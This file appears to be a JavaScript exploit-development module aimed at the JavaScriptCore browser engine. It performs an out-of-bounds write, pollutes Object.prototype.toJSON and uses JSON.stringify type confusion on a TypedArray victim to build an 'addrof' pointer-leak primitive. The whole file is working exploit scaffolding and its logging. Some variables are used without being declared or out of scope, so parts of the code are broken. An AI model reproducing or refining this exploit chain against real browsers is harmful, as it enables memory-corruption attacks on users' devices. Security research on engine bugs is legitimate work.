// js/script3/testArrayBufferVictimCrash.mjs (v48_ExploitCircularReference)

import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_write_absolute,
    clearOOBEnvironment
} from '../core_exploit.mjs';
import { JSC_OFFSETS } from '../config.mjs'; // Importar offsets do JSC para leitura de estruturas

export const FNAME_MODULE_TYPEDARRAY_ADDROF_V48_ECR = "OriginalHeisenbug_TypedArrayAddrof_v48_ExploitCircularReference";

const VICTIM_BUFFER_SIZE = 256;
const LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET = 0x7C;
const OOB_WRITE_VALUE = 0xFFFFFFFF;

// Objetos para vazar serão ArrayBuffer e DataView
let leak_target_buffer_v48 = null;
let leak_target_dataview_v48 = null;

let victim_typed_array_ref_v48 = null;
let probe_call_count_v48 = 0;
let all_probe_interaction_details_v48 = [];
let first_call_details_object_ref_v48 = null; // Referência ao C1_details

const PROBE_CALL_LIMIT_V48 = 5;

function toJSON_TA_Probe_ExploitCircularReference() {
    probe_call_count_v48++;
    const call_num = probe_call_count_v48;
    let current_call_details = { // Sempre criar um novo objeto de detalhes para esta chamada
        call_number: call_num,
        probe_variant: "TA_Probe_Addrof_v48_ExploitCircularReference",
        this_type: Object.prototype.toString.call(this),
        this_is_victim: (this === victim_typed_array_ref_v48),
        this_is_C1_details_obj: (this === first_call_details_object_ref_v48 && first_call_details_object_ref_v48 !== null),
        payload_A_assigned: false,
        payload_B_assigned: false,
        error_in_probe: null,
        addrof_result_from_this: null // Armazenar resultado de addrof se 'this' for um tipo explorável
    };
    logS3(`[${current_call_details.probe_variant}] Call #${call_num}. 'this' type: ${current_call_details.this_type}. IsVictim? ${current_call_details.this_is_victim}. IsC1DetailsObj? ${current_call_details.this_is_C1_details_obj}`, "leak");

    try {
        if (call_num > PROBE_CALL_LIMIT_V48) {
            logS3(`[${current_call_details.probe_variant}] Call #${call_num}: Probe call limit.`, "warn");
            all_probe_interaction_details_v48.push(current_call_details);
            return { recursion_stopped_v48: true, call: call_num };
        }

        // --- Lógica Principal da Sonda ---

        // Caso 1: 'this' é a vítima original (primeira chamada)
        if (call_num === 1 && current_call_details.this_is_victim) {
            logS3(`[${current_call_details.probe_variant}] Call #${call_num}: 'this' is victim. Creating and returning C1_details object.`, "info");
            first_call_details_object_ref_v48 = current_call_details; // Guarda a REFERÊNCIA para C1_details
            all_probe_interaction_details_v48.push(current_call_details);
            return current_call_details; // Retorna o próprio objeto de detalhes da Call #1
        }
        // Caso 2: 'this' é o C1_details (type-confused)
        else if (current_call_details.this_is_C1_details_obj && current_call_details.this_type === '[object Object]') {
            logS3(`[${current_call_details.probe_variant}] Call #${call_num}: TYPE CONFUSION ON C1_DETAILS_OBJECT ('this')! Attempting to assign leak targets...`, "vuln");

            if (leak_target_buffer_v48) {
                this.payload_A = leak_target_buffer_v48; // Atribui ArrayBuffer
                current_call_details.payload_A_assigned = true;
                logS3(`[${current_call_details.probe_variant}] Call #${call_num}: Assigned leak_target_buffer_v48 to C1_details.payload_A.`, "info");
            }
            if (leak_target_dataview_v48) {
                this.payload_B = leak_target_dataview_v48; // Atribui DataView
                current_call_details.payload_B_assigned = true;
                logS3(`[${current_call_details.probe_variant}] Call #${call_num}: Assigned leak_target_dataview_v48 to C1_details.payload_B.`, "info");
            }

            logS3(`[${current_call_details.probe_variant}] Call #${call_num}: C1_details modified. Keys: ${Object.keys(this).join(',')}`, "info");

            all_probe_interaction_details_v48.push(current_call_details);
            return this; // Retornar o 'this' modificado (C1_details modificado)
        }
        // Caso 3: 'this' é um [object Object], [object ArrayBuffer] ou [object DataView]
        // Se este 'this' é o objeto que queremos vazar (ArrayBuffer ou DataView) ou se ele se tornou o this confuso (como o object_to_leak_A/B)
        else if (current_call_details.this_type === '[object ArrayBuffer]' || current_call_details.this_type === '[object DataView]' ||
                 (current_call_details.this_type === '[object Object]' && (this.marker_A_v48 || this.marker_B_v48))) { // Se for um dos nossos objetos de leak, que se tornou this.
            logS3(`[${current_call_details.probe_variant}] Call #${call_num}: 'this' is an INJECTED/CONFUSED OBJECT! Attempting to extract pointer! Type: ${current_call_details.this_type}`, "critical");
            let leaked_val = null;
            let target_obj_for_view = this;

            try {
                // Se for um ArrayBuffer, criamos DataView diretamente
                if (current_call_details.this_type === '[object ArrayBuffer]') {
                    target_obj_for_view = this; // O this é o ArrayBuffer
                }
                // Se for DataView ou TypedArray, usamos o buffer interno
                else if (this.buffer instanceof ArrayBuffer) {
                    target_obj_for_view = this.buffer; // Usar o ArrayBuffer subjacente
                } else if (current_call_details.this_type === '[object Object]' && (this.marker_A_v48 || this.marker_B_v48)) {
                    // Se 'this' é o objeto de leak simples, TENTAR ATRIBUIR UMA TYPEDARRAY NELE
                    // Esta é a parte agressiva de tentar converter o ponteiro
                    try {
                        let temp_float64_arr = new Float64Array(new ArrayBuffer(8));
                        // AQUI, a "mágica" pode acontecer: se a type confusion faz com que this.payload_A
                        // seja reinterpretado como um local de memória para um número.
                        temp_float64_arr[0] = object_to_leak_A_v48; // Coloca o objeto no TypedArray
                        leaked_val = temp_float64_arr[0]; // Lê como Float64. Se o bug é bom, pode ser o ponteiro.
                        logS3(`[${current_call_details.probe_variant}] Call #${call_num}: Tried direct object to Float64 conversion on this.payload_A. Result: ${leaked_val}`, "vuln");
                        current_call_details.addrof_result_from_this = leaked_val;
                        all_probe_interaction_details_v48.push(current_call_details);
                        return { leaked_address_v48: leaked_val, leaked_obj_type: current_call_details.this_type, method: "ObjectToFloat64" };

                    } catch (e_direct_leak) {
                        logS3(`[${current_call_details.probe_variant}] Call #${call_num}: Error in direct object to Float64 conversion: ${e_direct_leak.message}`, "warn");
                        // Fallback: Tentar ler o ponteiro do próprio 'this' se ele se comporta como TypedArray/DataView
                        // (Isso já está nas v41/v42/v43, mas a v46 não tem mais ArrayBuffer/DataView como targets de leak).
                        // Vamos simplificar e focar em apenas uma estratégia para este 'this'.
                        current_call_details.error_in_probe = `Failed direct leak: ${e_direct_leak.message}`;
                        all_probe_interaction_details_v48.push(current_call_details);
                        return { addrof_error_v48: e_direct_leak.message, type: current_call_details.this_type, method: "ObjectToFloat64_Failed" };
                    }
                } else {
                    throw new Error("Unexpected object type for pointer extraction.");
                }

                // Se não retornou acima (ou seja, se this era ArrayBuffer/DataView e não object_to_leak)
                // Lógica para ArrayBuffer/DataView - TENTAR LER DE OFFSET
                let view_on_this_obj = new DataView(target_obj_for_view);
                const offset_to_read = JSC_OFFSETS.ArrayBuffer.CONTENTS_IMPL_POINTER_OFFSET; // Comum para ponteiro de dados
                if (view_on_this_obj.byteLength < (offset_to_read + 8)) {
                    throw new RangeError(`Target object too small (${view_on_this_obj.byteLength} bytes) to read 8 bytes from offset ${toHex(offset_to_read)}.`);
                }
                let low = view_on_this_obj.getUint32(offset_to_read, true);
                let high = view_on_this_obj.getUint32(offset_to_read + 4, true);

                let int64_val = new AdvancedInt64(low, high);
                let temp_buffer_for_float_conversion = new ArrayBuffer(8);
                let temp_float64_view_conversion = new Float64Array(temp_buffer_for_float_conversion);
                let temp_uint32_view_conversion = new Uint32Array(temp_buffer_for_float_conversion);
                temp_uint32_view_conversion[0] = int64_val.low();
                temp_uint32_view_conversion[1] = int64_val.high();
                leaked_val = temp_float64_view_conversion[0];

                logS3(`[${current_call_details.probe_variant}] Call #${call_num}: Read from 'this' (ArrayBuffer/DataView) at offset ${toHex(offset_to_read)}. Leaked raw value: ${toHex(low)}:${toHex(high)} (as double: ${leaked_val})`, "vuln");
                current_call_details.addrof_result_from_this = leaked_val;
                all_probe_interaction_details_v48.push(current_call_details);
                return { leaked_address_v48: leaked_val, leaked_obj_type: current_call_details.this_type, from_offset: toHex(offset_to_read) };

            } catch (e_leak) {
                logS3(`[${current_call_details.probe_variant}] Call #${call_num}: ERROR during pointer extraction from 'this' (${current_call_details.this_type}): ${e_leak.name} - ${e_leak.message}`, "error");
                current_call_details.error_in_probe = e_leak.message;
                all_probe_interaction_details_v48.push(current_call_details);
                return { addrof_error_v48: e_leak.message, type: current_call_details.this_type, method: "OffsetRead_Failed" };
            }
        }
        // Caso 4: Outras chamadas, ou 'this' não é um tipo que tentamos explorar diretamente.
        else {
            logS3(`[${current_call_details.probe_variant}] Call #${call_num}: 'this' is unexpected. Type: ${current_call_details.this_type}`, "warn");
            all_probe_interaction_details_v48.push(current_call_details);
            return { generic_marker_v48: call_num };
        }

    } catch (e) {
        current_call_details.error_in_probe = e.message;
        logS3(`[${current_call_details.probe_variant}] Call #${call_num}: CRITICAL ERROR in probe: ${e.name} - ${e.message}`, "critical", FNAME_CURRENT_TEST);
        all_probe_interaction_details_v48.push(current_call_details);
        return { error_marker_v48: call_num };
    }
}

export async function executeTypedArrayVictimAddrofTest_ExploitCircularReference() {
    const FNAME_CURRENT_TEST = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V48_ECR}.triggerAndLog`;
    logS3(`--- Iniciando ${FNAME_CURRENT_TEST}: Heisenbug (ExploitCircularReference) & Addrof ---`, "test", FNAME_CURRENT_TEST);
    document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V48_ECR} Init...`;

    probe_call_count_v48 = 0;
    all_probe_interaction_details_v48 = [];
    victim_typed_array_ref_v48 = null;
    first_call_details_object_ref_v48 = null;

    // Criando os objetos para vazar. Serão objetos JS simples para começar,
    // e o fuzzing/leaking tentará transformá-los em ponteiros se eles se tornarem 'this'.
    object_to_leak_A_v48 = { marker_A_v48: "LeakMeA_ECR", idA: Date.now() };
    object_to_leak_B_v48 = { marker_B_v48: "LeakMeB_ECR", idB: Date.now() + Math.floor(Math.random() * 1000) };

    let errorCapturedMain = null;
    let rawStringifyOutput = null; // Captura a string bruta
    let stringifyOutput_parsed = null;

    let addrof_A_result = { success: false, msg: "Addrof A from payload_A: Default" };
    let addrof_B_result = { success: false, msg: "Addrof B from payload_B: Default" };
    const fillPattern = 0.48484848484848;

    let pollutionApplied = false;
    let originalToJSONDescriptor = null;
    try {
        await triggerOOB_primitive({ force_reinit: true });
        oob_write_absolute(LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET, OOB_WRITE_VALUE, 4);
        logS3(`  Critical OOB write to ${toHex(LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET)} performed. Value: ${toHex(OOB_WRITE_VALUE)}.`, "info", FNAME_CURRENT_TEST);
        await PAUSE_S3(100);

        victim_typed_array_ref_v48 = new Uint8Array(new ArrayBuffer(VICTIM_BUFFER_SIZE));
        let float64_view_on_victim_buffer = new Float64Array(victim_typed_array_ref_v48.buffer);
        for(let i = 0; i < float64_view_on_victim_buffer.length; i++) float64_view_on_victim_buffer[i] = fillPattern + i;
        logS3(`STEP 2: victim_typed_array_ref_v48 (Uint8Array) created. Its buffer filled.`, "test", FNAME_CURRENT_TEST);

        const ppKey = 'toJSON';
        originalToJSONDescriptor = Object.getOwnPropertyDescriptor(Object.prototype, ppKey);

        try {
            Object.defineProperty(Object.prototype, ppKey, { value: toJSON_TA_Probe_ExploitCircularReference, writable: true, configurable: true, enumerable: false });
            pollutionApplied = true;
            logS3(`  Object.prototype.toJSON polluted. Calling JSON.stringify(victim_typed_array_ref_v48)...`, "info", FNAME_CURRENT_TEST);
            rawStringifyOutput = JSON.stringify(victim_typed_array_ref_v48); // Captura a string bruta AQUI
            logS3(`  JSON.stringify completed. Raw Stringify Output: ${rawStringifyOutput}`, "info", FNAME_CURRENT_TEST);

            // Tenta parsear, mas agora estamos mais interessados em se a string bruta contém a circularidade.
            try {
                stringifyOutput_parsed = JSON.parse(rawStringifyOutput);
            } catch (e_parse) {
                logS3(`  Error parsing stringifyOutput: ${e_parse.message}. This is expected if circular structure occurred. Output was: ${rawStringifyOutput}`, "warn");
                stringifyOutput_parsed = { error_parsing_stringify_output: rawStringifyOutput, parse_error: e_parse.message };
            }

            let heisenbugConfirmed = false;
            // A confirmação da heisenbug será se algum 'this' Object recebeu os payloads
            const relevantCall = all_probe_interaction_details_v48.find(d => d.this_type === '[object Object]' && d.payload_A_assigned);
            if (relevantCall) {
                heisenbugConfirmed = true;
                logS3(`  EXECUTE: HEISENBUG & PAYLOAD ASSIGNMENT on 'this' of Call #${relevantCall.call_number} CONFIRMED! Type: ${relevantCall.this_type}`, "vuln", FNAME_CURRENT_TEST);
            } else {
                logS3(`  EXECUTE: ALERT: Heisenbug/Payload Assignment NOT confirmed in any Object 'this' call.`, "error", FNAME_CURRENT_TEST);
            }

            logS3("STEP 3: Checking stringifyOutput_parsed for leaked payloads...", "warn", FNAME_CURRENT_TEST);
            // Se stringifyOutput_parsed falhou por circularidade, o erro estará lá.
            // Se não falhou, verificamos as propriedades.
            if (stringifyOutput_parsed && typeof stringifyOutput_parsed === 'object' && stringifyOutput_parsed.payload_A !== undefined) {
                const payload_A_val = stringifyOutput_parsed.payload_A;
                if (typeof payload_A_val === 'number' && payload_A_val !== 0 && !isNaN(payload_A_val)) {
                    let pA_int64 = new AdvancedInt64(new Uint32Array(new Float64Array([payload_A_val]).buffer)[0], new Uint32Array(new Float64Array([payload_A_val]).buffer)[1]);
                    if (pA_int64.high() > 0x70000000 || pA_int64.low() > 0x10000000 || (pA_int64.high() & 0xFF000000) === 0x80000000) {
                        addrof_A_result.success = true; addrof_A_result.msg = `SUCCESS: Possible pointer for A: ${pA_int64.toString(true)}`;
                    } else { addrof_A_result.msg = `Payload A is num but not ptr: ${payload_A_val}`; }
                } else if (payload_A_val && payload_A_val.marker_A_v48 === object_to_leak_A_v48.marker_A_v48) {
                    addrof_A_result.msg = `Payload A is object_to_leak_A_v48 directly (not numeric pointer).`;
                } else { addrof_A_result.msg = `Payload A not a useful number or object: ${JSON.stringify(payload_A_val)}`; }

                const payload_B_val = stringifyOutput_parsed.payload_B;
                if (typeof payload_B_val === 'number' && payload_B_val !== 0 && !isNaN(payload_B_val)) {
                    let pB_int64 = new AdvancedInt64(new Uint32Array(new Float64Array([payload_B_val]).buffer)[0], new Uint32Array(new Float64Array([payload_B_val]).buffer)[1]);
                    if (pB_int64.high() > 0x70000000 || pB_int64.low() > 0x10000000 || (pB_int64.high() & 0xFF000000) === 0x80000000) {
                        addrof_B_result.success = true; addrof_B_result.msg = `SUCCESS: Possible pointer for B: ${pB_int64.toString(true)}`;
                    } else { addrof_B_result.msg = `Payload B is num but not ptr: ${payload_B_val}`; }
                } else if (payload_B_val && payload_B_val.marker_B_v48 === object_to_leak_B_v48.marker_B_v48) {
                    addrof_B_result.msg = `Payload B is object_to_leak_B_v48 directly (not numeric pointer).`;
                } else { addrof_B_result.msg = `Payload B not a useful number or object: ${JSON.stringify(payload_B_val)}`; }
            } else if (rawStringifyOutput.includes("circular structure")) { // Verifica o erro de circularidade na string bruta
                addrof_A_result.msg = "Raw stringify output contained 'circular structure' error. Objects were assigned, but not serialized as numbers.";
                addrof_B_result.msg = "Raw stringify output contained 'circular structure' error. Objects were assigned, but not serialized as numbers.";
                logS3(`  Raw stringify output indicates circular structure, but not numeric leak. This is a good sign for control!`, "info");
            } else {
                addrof_A_result.msg = "stringifyOutput_parsed was not an object, null, or did not contain expected payloads.";
                addrof_B_result.msg = "stringifyOutput_parsed was not an object, null, or did not contain expected payloads.";
                logS3(`  stringifyOutput_parsed type: ${typeof stringifyOutput_parsed}, content: ${JSON.stringify(stringifyOutput_parsed)}`, "warn");
            }

            if (addrof_A_result.success || addrof_B_result.success) {
                document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V48_ECR}: Addr SUCCESS!`;
            } else if (heisenbugConfirmed) {
                document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V48_ECR}: Heisenbug OK, Addr Fail`;
            } else {
                document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V48_ECR}: No Heisenbug?`;
            }

        } catch (e_str) {
            errorCapturedMain = e_str;
            logS3(`  CRITICAL ERROR during JSON.stringify or processing: ${e_str.name} - ${e_str.message}${e_str.stack ? '\n'+e_str.stack : ''}`, "critical", FNAME_CURRENT_TEST);
            document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V48_ECR}: Stringify/Log ERR`;
        } finally {
            if (pollutionApplied) {
                if (originalToJSONDescriptor) Object.defineProperty(Object.prototype, ppKey, originalToJSONDescriptor); else delete Object.prototype[ppKey];
                logS3(`  Object.prototype.toJSON restored.`, "info", FNAME_CURRENT_TEST);
            }
        }
    } catch (e_outer_main) {
        errorCapturedMain = e_outer_main;
        logS3(`  CRITICAL ERROR in main test execution: ${e_outer_main.name} - ${e_outer_main.message}${e_outer_main.stack ? '\n'+e_outer_main.stack : ''}`, "critical", FNAME_CURRENT_TEST);
        document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V48_ECR} CRITICAL FAIL`;
    } finally {
        clearOOBEnvironment();
        logS3(`--- ${FNAME_CURRENT_TEST} Completed ---`, "test", FNAME_CURRENT_TEST);
        logS3(`Total probe calls: ${probe_call_count_v48}`, "info", FNAME_CURRENT_TEST);
        logS3(`Addrof A: Success=${addrof_A_result.success}, Msg='${addrof_A_result.msg}'`, addrof_A_result.success ? "good" : "warn", FNAME_CURRENT_TEST);
        logS3(`Addrof B: Success=${addrof_B_result.success}, Msg='${addrof_B_result.msg}'`, addrof_B_result.success ? "good" : "warn", FNAME_CURRENT_TEST);

        victim_typed_array_ref_v48 = null;
        all_probe_interaction_details_v48 = [];
        probe_call_count_v48 = 0;
        first_call_details_object_ref_v48 = null;
        object_to_leak_A_v48 = null;
        object_to_leak_B_v48 = null;
    }
    return {
        errorCapturedMain: errorCapturedMain,
        potentiallyCrashed: errorCapturedMain?.name === 'RangeError',
        stringifyResult: stringifyOutput_parsed,
        // toJSON_details está causando circularidade, remover por enquanto.
        all_probe_calls_for_analysis: [...all_probe_interaction_details_v48],
        total_probe_calls: probe_call_count_v48,
        addrof_A_result: addrof_A_result,
        addrof_B_result: addrof_B_result
    };
}
